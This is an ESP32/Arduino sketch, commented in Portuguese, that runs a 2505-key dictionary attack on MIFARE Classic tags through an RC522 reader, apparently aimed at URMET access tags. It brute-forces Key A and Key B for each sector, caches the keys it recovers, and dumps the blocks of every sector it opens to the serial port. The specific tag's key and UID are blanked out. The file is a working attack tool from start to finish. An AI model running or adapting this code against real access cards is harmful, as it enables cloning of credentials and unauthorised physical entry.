// COPIA PUBLICADA: chave do setor, UID e dados dos blocos da tag original foram
// omitidos (marcados como *_OMITIDA / *_OMITIDO acima). Nao e o .ino de build.
// =====================================================================
//  RC522 - Ataque de dicionario GRANDE (2505 chaves) na MIFARE Classic
//  Testa Key A e Key B por setor; reaproveita chaves achadas p/ acelerar.
//  Despeja os blocos dos setores que abrirem. Salva o keyfile no Serial.
//  Ligacao: SDA->D5 SCK->D18 MOSI->D23 MISO->D19 RST->D22 3V3->3V3 GND->GND
// =====================================================================
#include <SPI.h>
#include <MFRC522.h>
#include "keys.h"

// --- segredos omitidos para publicar (o workspace tem os valores reais) ---
#define KEYA_URMET_OMITIDA  0x00,0x00,0x00,0x00,0x00,0x00
#define UID_OMITIDO         0x00,0x00,0x00,0x00
#define KEY_DIC_OMITIDA     0x00,0x00,0x00,0x00,0x00,0x00
#define MFG_OMITIDO         0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

#define SS_PIN  5
#define RST_PIN 22
MFRC522 rfid(SS_PIN, RST_PIN);

byte foundKeyA[16][6], foundKeyB[16][6];
bool hasA[16], hasB[16];
// cache de chaves ja descobertas (aceleram outros setores)
byte cache[32][6]; int nCache = 0;

// chaves que ja sabemos desta tag (pre-carregadas no cache)
const byte SEED[][6] = {
  {KEY_DIC_OMITIDA},
  {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
};
const int NSEED = 2;

bool reselect() {
  for (int att = 0; att < 10; att++) {           // resiste a tremidas
    rfid.PICC_HaltA(); rfid.PCD_StopCrypto1();
    byte atqa[2]; byte l = 2;
    MFRC522::StatusCode s = rfid.PICC_WakeupA(atqa, &l);
    if (s != MFRC522::STATUS_OK) { l = 2; s = rfid.PICC_RequestA(atqa, &l); }
    if (s == MFRC522::STATUS_OK && rfid.PICC_ReadCardSerial()) return true;
    delay(40);
  }
  return false;
}

bool tryOne(byte trailer, byte keyType, const byte *k) {
  MFRC522::MIFARE_Key key; memcpy(key.keyByte, k, 6);
  if (rfid.PCD_Authenticate(keyType, trailer, &key, &rfid.uid) != MFRC522::STATUS_OK) { reselect(); return false; }
  // VERIFICA com leitura real do trailer -> glitch nao passa
  byte buf[18]; byte len = 18;
  bool rok = (rfid.MIFARE_Read(trailer, buf, &len) == MFRC522::STATUS_OK);
  rfid.PCD_StopCrypto1();
  if (!rok) { reselect(); return false; }
  return true;
}

void addCache(const byte *k) {
  for (int i = 0; i < nCache; i++) if (!memcmp(cache[i], k, 6)) return;
  if (nCache < 32) { memcpy(cache[nCache++], k, 6); }
}

void printKey(const byte *k) { for (int i = 0; i < 6; i++) Serial.printf("%02X", k[i]); }

void crack() {
  nCache = 0;
  for (int i = 0; i < NSEED; i++) addCache(SEED[i]);   // pre-carrega chaves conhecidas
  for (int i = 0; i < 16; i++) { hasA[i] = hasB[i] = false; }
  Serial.print("\n===INICIO=== UID:");
  for (byte i = 0; i < rfid.uid.size; i++) Serial.printf(" %02X", rfid.uid.uidByte[i]);
  Serial.println();

  for (byte s = 0; s < 16; s++) {
    byte trailer = s * 4 + 3;
    // 1) chaves ja achadas (cache) para A e B
    for (int c = 0; c < nCache && !hasA[s]; c++)
      if (tryOne(trailer, MFRC522::PICC_CMD_MF_AUTH_KEY_A, cache[c])) { hasA[s]=true; memcpy(foundKeyA[s], cache[c], 6); }
    for (int c = 0; c < nCache && !hasB[s]; c++)
      if (tryOne(trailer, MFRC522::PICC_CMD_MF_AUTH_KEY_B, cache[c])) { hasB[s]=true; memcpy(foundKeyB[s], cache[c], 6); }

    // 2) dicionario completo
    for (int i = 0; i < NKEYS && !hasA[s]; i++) {
      byte k[6]; for (int j = 0; j < 6; j++) k[j] = pgm_read_byte(&KEYS[i][j]);
      if (tryOne(trailer, MFRC522::PICC_CMD_MF_AUTH_KEY_A, k)) { hasA[s]=true; memcpy(foundKeyA[s], k, 6); addCache(k); }
      if ((i & 511) == 511) Serial.printf("  setor %d: testadas %d chaves...\n", s, i + 1);
    }
    for (int i = 0; i < NKEYS && !hasB[s]; i++) {
      byte k[6]; for (int j = 0; j < 6; j++) k[j] = pgm_read_byte(&KEYS[i][j]);
      if (tryOne(trailer, MFRC522::PICC_CMD_MF_AUTH_KEY_B, k)) { hasB[s]=true; memcpy(foundKeyB[s], k, 6); addCache(k); }
    }

    Serial.printf("Setor %2d: ", s);
    if (hasA[s]) { Serial.print("KeyA="); printKey(foundKeyA[s]); } else Serial.print("KeyA=? ");
    if (hasB[s]) { Serial.print("  KeyB="); printKey(foundKeyB[s]); } else Serial.print("  KeyB=?");
    Serial.println();

    // dump dos blocos do setor se abriu
    if (hasA[s] || hasB[s]) {
      byte kt = hasA[s] ? MFRC522::PICC_CMD_MF_AUTH_KEY_A : MFRC522::PICC_CMD_MF_AUTH_KEY_B;
      MFRC522::MIFARE_Key key; memcpy(key.keyByte, hasA[s]?foundKeyA[s]:foundKeyB[s], 6);
      if (rfid.PCD_Authenticate(kt, trailer, &key, &rfid.uid) == MFRC522::STATUS_OK) {
        for (byte b = s*4; b <= trailer; b++) {
          byte buf[18]; byte len = 18;
          if (rfid.MIFARE_Read(b, buf, &len) == MFRC522::STATUS_OK) {
            Serial.printf("   B%02d:", b);
            for (byte x = 0; x < 16; x++) Serial.printf(" %02X", buf[x]);
            Serial.println();
          }
        }
      }
      rfid.PCD_StopCrypto1();
    }
    if (!reselect()) { Serial.println("(cartao saiu - reaproxime)"); break; }
  }

  int ab = 0; for (int i = 0; i < 16; i++) if (hasA[i] || hasB[i]) ab++;
  Serial.printf("\nResumo: %d/16 setores abertos.\n", ab);
  Serial.println("===FIM DO ATAQUE===");
}

bool sensorOk = false;   // estado do preflight do sensor
bool avisouAguarda = false;

// Detecta a tag mesmo que ela JA esteja encostada (WUPA acorda IDLE e HALT)
bool tagPresent() {
  rfid.PCD_WriteRegister(MFRC522::TxModeReg, 0x00);
  rfid.PCD_WriteRegister(MFRC522::RxModeReg, 0x00);
  rfid.PCD_WriteRegister(MFRC522::ModWidthReg, 0x26);
  byte atqa[2]; byte l = 2;
  MFRC522::StatusCode s = rfid.PICC_WakeupA(atqa, &l);
  if (s != MFRC522::STATUS_OK && s != MFRC522::STATUS_COLLISION) return false;
  return rfid.PICC_ReadCardSerial();
}

void setup() {
  Serial.begin(115200);
  delay(300);
  SPI.begin(18, 19, 23, SS_PIN);
  rfid.PCD_Init();
  rfid.PCD_SetAntennaGain(rfid.RxGain_max);
  Serial.printf("\n=== Ataque de dicionario (%d chaves) ===\n", NKEYS);
  Serial.println("[PREFLIGHT] Verificando sensor...");
}

void loop() {
  // ---------- 1) SANIDADE DO SENSOR ----------
  byte v = rfid.PCD_ReadRegister(MFRC522::VersionReg);
  if (v == 0x00 || v == 0xFF) {
    Serial.printf("[PREFLIGHT] FALHA: RC522 nao responde (0x%02X). Confira a ligacao (3V3/GND/MISO/MOSI/SCK/SDA/RST)...\n", v);
    rfid.PCD_Reset(); rfid.PCD_Init(); rfid.PCD_SetAntennaGain(rfid.RxGain_max);
    sensorOk = false; avisouAguarda = false;
    delay(1000);
    return;
  }
  if (!sensorOk) {
    Serial.printf("[PREFLIGHT] OK: RC522 conectado (versao 0x%02X).\n", v);
    sensorOk = true;
  }

  // ---------- 2) DETECCAO DA TAG (WUPA: acha ate ja encostada) ----------
  if (!tagPresent()) {
    if (!avisouAguarda) { Serial.println("[PREFLIGHT] Sensor OK. Aproxime a tag URMET..."); avisouAguarda = true; }
    delay(120);
    return;
  }
  Serial.print("[PREFLIGHT] TAG DETECTADA, UID:");
  for (byte i = 0; i < rfid.uid.size; i++) Serial.printf(" %02X", rfid.uid.uidByte[i]);
  Serial.println("  -> iniciando ataque.");
  avisouAguarda = false;

  // ---------- 3) ATAQUE ----------
  crack();
  rfid.PICC_HaltA(); rfid.PCD_StopCrypto1();
  delay(5000);
}
